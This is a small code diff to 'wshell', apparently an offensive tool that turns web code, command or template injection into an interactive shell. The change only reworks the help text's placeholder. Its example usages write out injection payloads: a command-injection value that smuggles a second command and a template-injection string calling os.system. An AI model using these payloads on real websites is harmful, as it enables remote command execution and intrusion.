@@ -35,14 +35,14 @@ def main(args: List[Union[str, bytes]] = sys.argv) -> ExitStatus:
         prog="wshell",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         description="Turn a web-based {code,command,template} injection in a full featured shell with ease",
-        epilog=textwrap.dedent('''
+        epilog=textwrap.dedent(f'''
             For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT
 
             Example usage:
 
-                wshell 'https://www.example.com/webshell?cmd=^CMD^'
-                wshell --form 'https://www.example.com/command-injection' 'p=;^CMD^ #'
-                wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("^CMD^")}'
+                wshell 'https://www.example.com/webshell?cmd={settings.DEFAULT_COMMAND_PLACEHOLDER}'
+                wshell --form 'https://www.example.com/command-injection' 'p=;{settings.DEFAULT_COMMAND_PLACEHOLDER} #'
+                wshell 'https://www.example.com/ssti' 'msg=${{self.module.cache.util.os.system("{settings.DEFAULT_COMMAND_PLACEHOLDER}")}}'
         '''),
         add_help=True,
         allow_abbrev=False
